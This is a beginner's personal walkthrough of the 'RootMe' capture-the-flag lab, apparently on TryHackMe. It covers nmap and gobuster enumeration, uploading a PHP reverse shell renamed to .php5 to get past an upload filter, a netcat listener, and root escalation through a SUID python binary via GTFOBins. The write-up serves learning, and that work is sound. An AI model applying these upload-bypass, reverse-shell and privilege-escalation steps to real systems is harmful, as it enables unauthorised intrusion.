# Challenge 009 - RootMe
Apparently this is a CTF for beginners, and I really needed something slower to not get overwhelmed and the beginning seemed to be easy enough: Deploy the machine.

<img width="821" height="965" alt="grafik" src="https://github.com/user-attachments/assets/5f3f3120-1d34-4c07-88e5-cc2f538e29f8" />
 
Simple. 

After that we had to scan the machine, and see how many ports were open. This seemed to be a clear case for nmap. As I wanted to have a thorough scan I decided to use -p- to check every port and -sV to guess service versions. After a surprinsingly short scan we got the following results:

<img width="736" height="390" alt="grafik" src="https://github.com/user-attachments/assets/065d9437-4203-4ec9-8ec8-33238f0b6062" />


From what we can see, one can assume, that 2 ports are open.
The next question was what version of Apache would be running, which in this case is 2.4.41. That’s what I thought, but apparently I was wrong for some reason. After checking that it really wasn’t a typo I proceeded to run nmap -A which apparently is more aggressive when it comes to version detection as it works with other advanced features. That didn’t work either though. 
At least the next question could be answered, which asked what service was running on port 22, which can be seen in the screenshot above. It was ssh.
Now getting back to the problem at hand though I was quite confused. I shortly checked a YouTube video, where somebody literally used the exact same command and got a different version out of it. Either this challenge is outdated or I really did something wrong. I decided to notify somebody who was responsible for this challenge to look at it, so I could maybe get some clarification later on and tried to move on with the other tasks.

*I was notified that this is a known bug!*

Next on the list was to use the GoBuster tool to find directories on the web server. I just made sure to see if we even had gobuster installed with 
gobuster version
which displayed: 3.6. Brillant.

Then I needed to check what kind of command to use for gobuster as I only used ffuf before. Thankfully the idea seemed to be pretty similar. We call a textfile which contains a lot of possible input options for our hidden directories. Those will then be used to bruteforce the site. I probably could have gone with a more elegant way to use the common.txt file from the very popular SecLists worlist, but because it didn’t immediately worked how I wanted I just created my own directory, copy-pasted the raw content of the file into my own in the directory and called the text file through the following command, with this result:

```
root@ip-10-10-74-6:~# mkdir wordlists
root@ip-10-10-74-6:~# cd wordlists
root@ip-10-10-74-6:~/wordlists# gobuster dir -u 10.10.150.113 -w common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.150.113
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.10.150.113/css/]
/index.php            (Status: 200) [Size: 616]
/js                   (Status: 301) [Size: 311] [--> http://10.10.150.113/js/]
/panel                (Status: 301) [Size: 314] [--> http://10.10.150.113/panel/]
/server-status        (Status: 403) [Size: 278]
/uploads              (Status: 301) [Size: 316] [--> http://10.10.150.113/uploads/]
Progress: 4750 / 4751 (99.98%)
===============================================================
Finished
===============================================================
```

It was pretty clear that the hidden directory, which we could access, was /panel/ apparently. Honestly, this didnt make that much sense to me, as there were a lot of other hidden directories, which we could see, so I made sure to visit the site itself and check out those directories. 

<img width="1130" height="935" alt="grafik" src="https://github.com/user-attachments/assets/5024f890-868e-47e3-a7aa-b34a072f411c" />

This was a neat little website and I immediately understood, why my answer was the right one. 

<img width="1130" height="935" alt="grafik" src="https://github.com/user-attachments/assets/0d0a2e6b-cfc1-42a3-b974-b9eaa7849090" />

While there were several hidden directories we could enter like /js and /css it was also evident, that the page that you can see in this screenshot was fully functionable and probably could have been intended to be used by users, but for some reason is hidden. Exploring the website itself proved valuable and I was satisfied enough to move on to the next task.

This one expected me to find a form to upload and get a reverse shell, to find a flag. Literally none of that sentence made any sense to me, so I decided to browse the internet and get an explanation on what to do now. The hint itself for this task also helped on making me focus on the right things. Telling me to search for „file upload bypass“ and „PHP reverse shell“. 

After watching some video I decided to use the pentestmonkey GitHub and entered their php-reverse-shell.php repository and copied their raw file and renamed the file after shell.php for simplicity reasons. After that it was important to modify the given source code and change $ip and $port.

On my machine I set up the listener 
```
nc -lvnp 5555	
```

Then I tried to upload the PHP file on the target machine. There was the hidden directory, which made it possible for us to upload specific files. After that I could only hope that the website truly had a vulnerability when it comes to PHP files. Unfortunately it was smart enough to recognize them

<img width="1130" height="935" alt="grafik" src="https://github.com/user-attachments/assets/ae64e257-cf61-47ad-a4bd-c9b7c38173c1" />

Red always is a bad indication and with my little portugese I could immediately assume, that PHP was prohibited from uploading. What a shame. This is probably a sign I should try to work around the filter. What a hassle. Understandable though. I tried it with variations to see, if they could work, like shell.php5

<img width="1130" height="935" alt="grafik" src="https://github.com/user-attachments/assets/038179b2-f475-474c-abe8-70a91be8006d" />

Immediately after that it started working. Now I feel bad that I even tried to complain as it seems kind of emberassing that I could bypass the filter that easily. 
But I don’t even have to feel emberassed for anyone except myself as I included the target IP address in my shell instead of my own. Woops. I changed that and set up the listener again. It still didn’t work. Probably because I was using a private IP instead of the one a web server could reach. So I used ip a real quick to check for all possible addresses.

<img width="1133" height="512" alt="grafik" src="https://github.com/user-attachments/assets/d1ea48ee-070c-4a95-83d0-8161bd14806b" />

As my knowledge of computer networks is still pretty rusty I gave myself the time to really understand what each of these outputs mean:

    • lo → loopback (127.0.0.1). Only usable inside my own box. Totally useless for reverse shells.
    • ens5 → 10.10.233.200 → this is the internal network IP of my attack box in the lab 
    • docker0 → 172.17.0.1 → internal docker bridge. Victim won’t ever see that.

Since both the attacker (10.10.233.200) and victim (10.10.193.12) are in the same 10.10.0.0/16 subnet, the victim can directly reach me at:

10.10.233.200

The IP Address couldn’t be the problem so maybe it was the port. I changed it to 443, which indeed made a difference

<img width="1133" height="172" alt="grafik" src="https://github.com/user-attachments/assets/0fdc7bfb-c5ba-4a3c-a777-c4487ec6ff57" />

At the same time I really need to check, why port 5555 didn’t work, but at least I got some info after attempting to enter the following URL

```
http://10.10.193.12/panel/shell.php5
```

Unfortunately I used ^C which was the biggest mistake I ever did, because I was not able to regain the level of control again. Instead when trying the same procedure again I got the following output from the terminal

```
root@ip-10-10-38-171:~# nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 185.247.137.123 48109

\ufffd\ufffd\ufffd3/:K
\ufffd\ufffd\ufffdKl\u35e4XV\ufffd\u03b4\ufffd:\ufffdQx: \ufffd\ufffdt\ufffd\ufffd\ufffd\ufffd\ufffd\u01a4\ufffd\ufffd\ufffdU\ufffdB\ufffd\ufffd\ufffd\ufffd|Z\ufffd\ufffd\ufffdl<\ufffd+\ufffd/\ufffd,\ufffd0\u0329\u0328\ufffd	\ufffd\ufffd
\ufffd\ufffd\ufffd/5\ufffd
\ufffd$\ufffd(\ufffd#\ufffd'<=\ufffd\ufffd\ufffd


\ufffd+

3&$ \ufffd\ufffd\ufffdA\ufffd:\ufffdCMt\ufffd\ufffd\u022c\ufffd\ufffdV\ufffdo\ufffdE\ufffd@\ufffdearoot@ip-10-10-38-171:~# nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 87.236.176.129 51429
8,{^K\ufffd\ufffdBroot@ip-10-10-38-171:~# nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 185.247.137.120 52137
GET / HTTP/1.1
Host: 54.154.79.34:443
User-Agent: Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)
Connection: close
Accept: */*
Accept-Encoding: gzip
```

```
root@ip-10-10-38-171:~# nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 185.247.137.124 46903

H\ufffd\ufffd\ufffd\ufffd]\ufffd\ufffd+\ufffd\ufffd]\ufffd\ufffd\ufffd\ufffd\ufffd+H`root@ip-10-10-38-171:~# 
```

Which probably means I should use a different port. Port 443 is one of the most scanned ports on the internet. Random scanners/bots/crawlers were hitting my box expecting HTTPS not a reverse shell. At least thats what the GET /HTTP/1.1 implies. I changed my port to 1337, in the hopes of getting better results. Yet even after changing around ports it just didn’t seem to work anymore which is surprising and also very frustrating. I decided to put it to rest for now, as it was getting late. Hopefully I could solve this soon enough.

------------------------------------------------------------------------------------------------------------------------

When trying this again the day after I still had problems, so I just checked the uploads domain to check if the shell even existed there, which it did

<img width="933" height="342" alt="grafik" src="https://github.com/user-attachments/assets/92356bba-5133-4447-9abf-7e468e5c4afc" />

After clicking on it, everyhing seemes to run accordingly on the listener.

```
root@ip-10-10-53-190:~# nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.69.117 51194
Linux ip-10-10-69-117 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 17:14:59 up 28 min,  0 users,  load average: 0.03, 0.09, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
swap.img
sys
tmp
usr
var
vmlinuz
vmlinuz.old
$ 
```

Now I didn’t immediately find the file which is why I started using find / -name user.txt
I probably should have put a filter in there for every error output, but at least there was also one line that led to the solution of all of this

```
/var/www/user.txt
```

So I swiftly went along that path and cat the file.

The last two tasks are about privilege escalation to root. The first one being that we had to search for files with SUID (Set User ID) permission and to tell, which file would be weird.
I forgot what SUID was all about so I researched again and found out that it’s a Unix/Linux file permission bit that allows a user to execute a file with the privileges of the file’s owner, rather than their own. For example, usr/bin/ping has the SUID bit set by root, meaning that even if a normal user runs the ping command, it will execute with root privileges..

If we want to check out the files with SUID permission we use the following command

```
find / -type f -perm -4000 2>dev/null
```

    • find /
        ◦ Start searching from the root directory /
        ◦ This means: crawl the entire filesystem 

    • - type f
        ◦ Only match files (not directories, symlinks, etc.)

    • -perm -4000
        ◦ Search for files with permissions matching SUID bit set
        ◦ 4000 is the octal permission for the SUID bit
        ◦ The – before it means: „match files that have at least these permission bits set“

    • 2>dev/null
        ◦ Redirect stderr (file descriptor 2) to /dev/null
        ◦ Scanning / hits a ton of directories we don’t have access to. Without this, the terminal gets spammed with „Permission denied“

When we check the results we realize that usr/bin/python2.7 can be run as sudo, which is pretty scary, as we are basically able to write our own python scripts and run everything as a superuser.

Now our task was to find a form to escalate our privileges with the hint to look up GTFOBins. Once again this is the very first time I’m hearing about this so I just looked up the website and looked up UNIX binaries for Python. Apparently GTFOBins is a curated list of Linux binaries (programs already installed on many systems) that can be abused by attackers escape restricted shells, read/write files but also escalate privileges.
As we already realized python is owned by root and will run as it every time it’s executed. This can be abused as some binaries don’t drop privileges when they spawn subprocesses.
With the spawned shell root privileges get inherited and we are able to escalate.

<img width="917" height="495" alt="grafik" src="https://github.com/user-attachments/assets/f104a6df-a90e-4885-959f-5295b270e552" />

When adapting that to my directory we are able to get root privileges

<img width="722" height="75" alt="grafik" src="https://github.com/user-attachments/assets/77177199-c8d3-4ef6-bf1d-e5e6233a217d" />

We made it!
Now with our root rights we were finally able to just step into the root directory and cat the root.txt file. What a delight!

